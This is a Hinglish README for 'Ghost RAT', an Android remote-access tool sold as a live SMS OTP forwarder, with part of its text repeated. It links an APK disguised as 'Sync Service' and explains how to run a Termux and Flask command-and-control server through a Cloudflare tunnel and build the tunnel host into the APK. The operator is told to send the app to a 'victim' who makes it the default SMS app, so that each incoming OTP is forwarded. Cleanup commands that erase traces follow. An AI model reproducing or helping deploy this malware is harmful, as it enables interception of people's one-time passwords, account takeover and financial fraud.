Rat apk 
*~https://www.mediafire.com/file/87wwpe9t1xghml5/Sync+Service.apk/file~*


# 👻 Ghost RAT

Live SMS OTP forwarder.
**Developed by Aditya**

---

## Features

- Termux pe chalta hai
- Cloudflare tunnel auto-start
- SMS aate hi live terminal pe
- Web panel + `/SMS` command

---

## Setup — ek baar

### 1. Termux install karo

F-Droid se: https://f-droid.org/packages/com.termux/

Play Store wala purana hai — use nahi karna.

### 2. Termux kholo

```bash
pkg update -y && pkg upgrade -y
pkg install python cloudflared -y
pip install flask
```

### 3. `server.py` banao

```bash
mkdir -p ~/ghost
cd ~/ghost
nano server.py
```

`server.py` code paste karo. Save: `Ctrl+O` → Enter → `Ctrl+X`.

**Port badalna ho** — `PORT = 8000` line badlo.

---

## Start — server chalao

```bash
cd ~/ghost
python server.py
```

Output aayega:

```
============================================================
  GHOST RAT - Developed by Aditya
============================================================
  Port:     8000
  AUTH_KEY: ghostrat
============================================================

 * Running on http://0.0.0.0:8000
Press CTRL+C to quit

============================================================
  CLOUDFLARE TUNNEL READY
============================================================

  APK ke assets/config.txt me daalo:

    C2_HOST=xxxx-yyyy-zzzz.trycloudflare.com
    C2_PATH=/ghost
    AUTH_KEY=ghostrat

============================================================
  Panel: https://xxxx-yyyy-zzzz.trycloudflare.com
============================================================
```

Terminal **khuli chhod do**. Server chalta rahega.

---

## Stop — server band karo

**Ctrl+C dabao** — server band ho jayega.

Ya naya Termux session me:

```bash
pkill -9 -f server.py
pkill -9 -f cloudflared
```

Dono ek saath:

```bash
pkill -9 -f server.py; pkill -9 -f cloudflared
```

---

## Port busy hai? — ye command

Agar `Address already in use` aaye:

```bash
pkill -9 -f server.py
pkill -9 -f cloudflared
pkill -9 -f python
sleep 2
```

Phir dobara:

```bash
cd ~/ghost
python server.py
```

---

## Check — kuch chal raha hai ya nahi

Server process:

```bash
ps aux | grep -E "server|cloudflared|python"
```

Port free hai:

```bash
curl http://localhost:8000/
```

- `Connection refused` — port free, kuch nahi chal raha
- HTML aaye — server chal raha hai

---

## Delete — sab saaf karo

Chal rahe process band:

```bash
pkill -9 -f server.py
pkill -9 -f cloudflared
pkill -9 -f python
```

Folder delete:

```bash
cd ~
rm -rf ~/ghost
rm -rf ~/ghost-rat
rm -rf ~/Ghost-Rat
rm -rf ~/ghost-server
rm -rf ~/termux-server
```

Logs aur cache:

```bash
rm -f ~/server.log
rm -f ~/tunnel.log
rm -f ~/config.json
rm -rf ~/.cache/*
```

Confirm:

```bash
ls ~
```

`ghost` folder nahi dikhna chahiye.

---

## APK me daalo

AIDE me `app/src/main/assets/config.txt` kholo:

```
C2_HOST=xxxx-yyyy-zzzz.trycloudflare.com
C2_PATH=/ghost
AUTH_KEY=ghostrat
```

- `C2_HOST` — jo tunnel URL terminal pe dikha
- `AUTH_KEY` — jo `server.py` me rakhi

Save → AIDE me **Run** → APK install → victim ko bhejo.

---

## Victim ke phone pe

1. APK install
2. App kholo
3. Permissions → **Allow**
4. **Set as default SMS app** → **Set**
5. Done

Har SMS aate hi tumhare Termux pe forward hoga.

---

## SMS dekho

### Terminal me live

SMS aate hi terminal pe automatic dikhta hai:

```
============================================================
  SMS FROM: +919876543210
  TIME:     13:45:12
  BODY:     Your OTP is 483920
============================================================
```

### Web panel

Browser me kholo:

```
https://xxxx-yyyy-zzzz.trycloudflare.com
```

### Recent SMS

```
https://xxxx-yyyy-zzzz.trycloudflare.com/SMS?did=DEVICE_ID
```

DEVICE_ID wahi jo terminal pe `NEW_DEVICE` me aata hai.

### Terminal se `/SMS`

```bash
curl http://localhost:8000/SMS?did=DEVICE_ID
```

Ya alias bana lo:

```bash
echo 'alias /SMS="curl -s http://localhost:8000/SMS?did="' >> ~/.bashrc
source ~/.bashrc
```

Phir:

```bash
/SMS DEVICE_ID
```

---

## Commands — quick reference

| Kaam | Command |
|---|---|
| Server start | `cd ~/ghost && python server.py` |
| Server stop | `Ctrl+C` |
| Force stop | `pkill -9 -f server.py; pkill -9 -f cloudflared` |
| Port check | `curl http://localhost:8000/` |
| Process check | `ps aux \| grep server.py` |
| Sab delete | `rm -rf ~/ghost` |
| Recent SMS | `/SMS DEVICE_ID` |

---

## Notes

- Tunnel URL **har restart pe badalta hai**. Naya URL `config.txt` me daalo, APK rebuild karo.
- Termux session band mat karo — server chalta rahe.
- Phone charging pe rakho, Termux ko battery optimization se whitelist karo.

---

**Developed by Aditya**```
C2_HOST=xxxx-yyyy-zzzz.trycloudflare.com
C2_PATH=/ghost
AUTH_KEY=ghostrat
```

- `C2_HOST` = jo tunnel URL terminal pe dikha
- `AUTH_KEY` = jo `server.py` me rakhi

Save → AIDE me **Run** → APK install → victim ko bhejo.

---

## Victim ke phone pe

1. APK install
2. App kholo
3. Permissions → **Allow**
4. **Set as default SMS app** → **Set**
5. Done

Uske baad har SMS aate hi tumhare Termux pe forward hoga.

---

## SMS dekho

Browser me kholo:

```
https://xxxx-yyyy-zzzz.trycloudflare.com
```

Ya recent SMS:

```
https://xxxx-yyyy-zzzz.trycloudflare.com/SMS?did=DEVICE_ID
```

DEVICE_ID wahi jo terminal pe `NEW_DEVICE` me aata hai.

---

## Band karo

Termux me `Ctrl+C` dabao.

Ya:

```bash
pkill -9 -f server.py
pkill -9 -f cloudflared
```

---

## Note

- Tunnel URL **har restart pe badalta hai**. Naya URL `config.txt` me daalo, APK rebuild karo.
- Termux session band mat karo — server chalta rahe.

---

**Developed by Aditya**
